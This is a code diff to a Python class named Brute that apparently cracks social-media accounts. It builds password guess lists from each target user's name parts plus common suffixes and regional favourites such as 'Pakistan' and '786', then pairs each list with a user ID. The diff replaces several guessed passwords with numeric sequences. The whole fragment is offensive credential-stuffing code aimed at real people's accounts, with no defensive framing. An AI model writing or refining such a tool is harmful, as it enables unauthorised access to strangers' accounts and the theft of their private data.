@@ -97,19 +97,19 @@ class Brute:
 						obj[0]+'12345', obj[0]+'786',
 						obj[1]+'786', obj[2]+'786',
 						obj[3]+'786', 'Pakistan',
-						'pakistan', '000786',
-						'sayang', '786786',
-						'sayang123', 'Sayang',
-						'123456',
+						'223344', '334455',
+						'556677', '667788',
+						'234567', '345678',
+						'456789',
 					]
 				elif len(obj) == 2:
 					listpass = [
-						obj[0]+'123', obj[0]+'12345',
+						obj[0]+'12', obj[0]+'1122',
 						obj[1]+'123', obj[1]+'12345',
 						'Pakistan', '123456',
 						'pakistan', '000786',
-						'sayang', '786786',
-						'sayang123', 'Sayang',
+						'334455', '445566',
+						'234567', '223344',
 						
 					]
 				elif len(obj) == 3:
@@ -119,8 +119,8 @@ class Brute:
 						obj[2]+'123', obj[2]+'12345',
 						'Pakistan', '123456',
 						'pakistan', '000786',
-						'sayang', '786786',
-						'sayang123', 'Sayang',
+						'334455', '445566',
+						'234567', '223344',
 					]
 				elif len(obj) == 4:
 					listpass = [
@@ -130,17 +130,17 @@ class Brute:
 						obj[3]+'123', obj[3]+'12345',
 						'Pakistan', '123456',
 						'pakistan', '000786',
-						'sayang', '786786',
-						'sayang123', 'Sayang',
+						'334455', '445566',
+						'234567', '223344',
 					]
 				else:
 					listpass = [
-						'sayang', 'Pakistan',
+						'234567', '345678',
+						'786000', '667788',
+						'556677', 'Pakistan',
 						'pakistan', '786786',
-						'sayang123', 'Pakistan',
-						'pakistan', '786786',
-						'Sayang', '123456789',
-						'123456',
+						'Khan123', '445566',
+						'223344',
 					]
 				self.target.append({'id': user['uid'], 'pw': listpass})
 			except: pass
